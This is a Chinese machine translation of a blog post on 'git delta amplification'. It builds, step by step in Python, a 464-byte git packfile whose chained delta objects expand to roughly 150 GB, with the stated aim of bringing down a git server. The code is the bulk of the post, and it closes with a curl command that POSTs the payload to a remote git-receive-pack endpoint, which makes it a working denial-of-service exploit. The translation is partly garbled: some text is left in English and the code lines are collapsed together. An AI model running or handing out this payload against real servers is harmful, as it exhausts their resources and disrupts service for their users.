# Git delta 扩增

> 原文：<https://medium.com/hackernoon/git-delta-amplification-4c55b70e5cf0>

git 协议的一个有趣的方面是 delta 对象。它们允许从一个对象复制粘贴内容来创建一个新的对象。让我们使用增量创建一个巨大的对象，并尝试摧毁一个 git 服务器！

# 这个计划

我们可以复制粘贴的最大字节数是 16711680 字节(255 << 16), so we’ll use a blob of this size and paste it a few thousand times. Just for fun we’ll actually start with a blob of 255 bytes and work our way up.

# The git protocol

But first things first, we need to learn the git protocol. The command responsible for receiving objects is **receive-pack** ，它首先期望的是一个引用更新列表。例如:

```
<OLD_SHA1> <NEW_SHA1> refs/heads/master
```

我们懒得去找一个有效的 *OLD_SHA1* ，所以我们将通过创建一个新的引用来绕过它。我们可以通过使用特殊的*零 id* 哈希:**00000000000000000000000000000000000**来实现这一点。对于 *NEW_SHA1* 我们将只使用一个伪散列，比如说**111111111111111111111111111**，因为我们希望 git 服务器在真正尝试验证这个散列之前崩溃。

最后，这些命令以 pkt-line 格式编码，增加了一个 4 字节长的十六进制前缀。所以，让我们看看目前为止我们有什么(我将使用 Python 3 作为代码示例)。

```
zero_id = b'0' * 40fake_id = b'1' * 40create_ref = b'%s %s refs/heads/xxx\x00\n' % (zero_id, fake_id)pkt_line = b'%04x%s' % (len(create_ref) + 4, create_ref)sys.stdout.buffer.write(pkt_line)sys.stdout.buffer.write(b'0000')
```

# 包裹

接下来，我们需要开始打包我们要发送的对象。让我们从头部开始:12 个字节，由 ASCII 中的“PACK”组成，后面是 4 个字节的版本号(总是 2)和 4 个字节的跟随对象数(所有数字都是按网络字节顺序排列的)。根据我们的计划，我们将从一个大小为 255 的 blob 对象开始，用它来生成一个大小为 65280 的 blob，用它来生成一个大小为 16711680 的 blob，最后是我们的大 blob，所以总共有 4 个对象。我们不会创建任何提交对象。

```
pack = bytearray()pack += b'PACK' + struct.pack('!II', 2, 4)
```

标题准备好了，让我们添加第一个 blob。包中的每个对象都需要一个对象头来编码它的类型和大小。我们将使用的类型号是:blobs 的 **3** 和 deltas 的 **7** 。

固定大小的字段太明显了，所以 git 使用自己的可变长度编码。让我们编写一个函数来实现这一点:

```
def object_header(obj_type, obj_size): header = bytearray() b = (obj_type << 4) | (obj_size & 15) obj_size >>= 4 while obj_size > 0: header.append(b | 0x80) b = obj_size & 0x7f obj_size >>= 7 header.append(b) return header
```

我们终于准备好添加第一个斑点了！

```
size0 = 255blob0 = os.urandom(size0)pack += object_header(3, size0)pack += zlib.compress(blob0)
```

# 三角洲

我们现在可以创建我们的第一个增量。对于大小为 65280 的新 blob，我们将复制粘贴 blob0 256 次。增量格式非常简单:

```
SRC_SIZE DST_SIZE [COMMANDS]
```

当然，大小也使用可变长度编码，所以让我们创建几个辅助函数:

```
def make_delta(src_size, dst_size, commands): return encode_size(src_size) + encode_size(dst_size) + commandsdef encode_size(n): b = bytearray() while n > 0: mod = n & 0x7f n >>= 7 if n > 0: b.append(0x80 | mod) else: b.append(mod) return b
```

我们还需要指向带有 20 字节散列头的源对象，所以让我们添加一个函数来计算 blob 的 id:

```
def blob_id(blob): m = hashlib.sha1() m.update(b'blob %d\0' % len(blob)) m.update(blob) return m.digest()
```

我们现在有了创建第一个 delta 对象的所有构件:

```
size1 = size0 * 256cmd1 = bytes([0x80 | 0x10, 0xff]) * 256delta1 = make_delta(size0, size1, cmd1)pack += object_header(7, len(delta1))pack += blob_id(blob0)     # sourcepack += zlib.compress(delta1)
```

让我们来谈谈我们创建的命令。第一个字节定义了我们正在做什么样的操作。 **0x80** 表示我们要从源对象中复制。 **0x10** 表示后面的字节会说要复制多少字节。所以这 2 个字节实质上就是:复制 255 个字节。我们这样做了 256 次。

好，让我们创建第二个增量:

```
size2 = size1 * 256cmd2 = bytes([0x80 | 0x20, 0xff]) * 256delta2 = make_delta(size1, size2, cmd2)pack += object_header(7, len(delta2))pack += blob_id(blob0 * 256)    # source blobpack += zlib.compress(delta2)
```

注意这里我们是如何使用命令 **0x20** 的，这意味着接下来的字节将被乘以 256，并被用作拷贝大小。所以我们的新命令翻译成:复制 65280 字节，256 次。还要注意，对于源 id，我们使用将由 **delta1** 生成的 blob。

delta2 是我们最大的构建块，让我们用它来生成一个大约 150 GB 的 blob。

```
size3 = size2 * 10000cmd3 = bytes([0x80 | 0x40, 0xff]) * 10000delta3 = make_delta(size2, size3, cmd3)pack += object_header(7, len(delta3))pack += blob_id(blob0 * 256 * 256)    # source blobpack += zlib.compress(delta3)
```

这里我们使用命令 **0x40** ，它将下面的字节乘以 65536，允许我们创建命令:复制 16711680 字节，10000 次。

就这样，总的包大小是 464 字节，产生大约 150 GB。您可以运行:

```
./amplify.py | git receive-pack /path/to/repo.git
```

或者尝试使用远程回购:

```
./amplify.py | curl -v -X POST — data-binary @- -H ‘Content-Type: application/x-git-receive-pack-request’ [https://host/path/repo.git/git-receive-pack](https://host/path/repo.git/git-receive-pack)
```

下面是最终来源:[https://gist . github . com/verigak/BDA 113 DC 5850d 2c B3 0 c 9 B3 C5 f 83 c 8141](https://gist.github.com/verigak/bda113dc5850d2cb30c9b3c5f83c8141)